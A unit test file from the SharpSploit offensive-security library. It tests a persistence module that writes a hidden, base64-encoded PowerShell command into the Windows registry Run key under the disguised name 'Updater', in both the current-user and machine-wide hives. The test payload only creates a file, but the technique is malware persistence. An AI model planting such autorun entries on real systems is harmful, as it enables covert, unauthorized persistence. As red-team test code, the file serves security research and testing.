// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using Win = Microsoft.Win32;
using Microsoft.VisualStudio.TestTools.UnitTesting;

using SharpSploit.Enumeration;
using SharpSploit.Persistence;

namespace SharpSploit.Tests.Persistence
{
    [TestClass]
    public class AutorunTests
    {
        [TestMethod]
        public void InstallHKCUAutorun()
        {
            string cmd = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(@"New-Item -Path C:\Temp\hkcu.txt -ItemType File"));
            string valueExpected = $@"C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -enc {cmd}";
            Autorun.InstallAutorun(Win.RegistryHive.CurrentUser, valueExpected);

            string result = Registry.GetRegistryKey(Win.RegistryHive.CurrentUser, @"Software\Microsoft\Windows\CurrentVersion\Run", "Updater");
            Assert.IsTrue(result.Contains(valueExpected));
        }

        [TestMethod]
        public void InstallHKLMAutorun()
        {
            string cmd = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(@"New-Item -Path C:\Temp\hkcu.txt -ItemType File"));
            string valueExpected = $@"C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -enc {cmd}";
            Autorun.InstallAutorun(Win.RegistryHive.LocalMachine, valueExpected);

            string result = Registry.GetRegistryKey(Win.RegistryHive.LocalMachine, @"Software\Microsoft\Windows\CurrentVersion\Run", "Updater");
            Assert.IsTrue(result.Contains(valueExpected));
        }
    }
}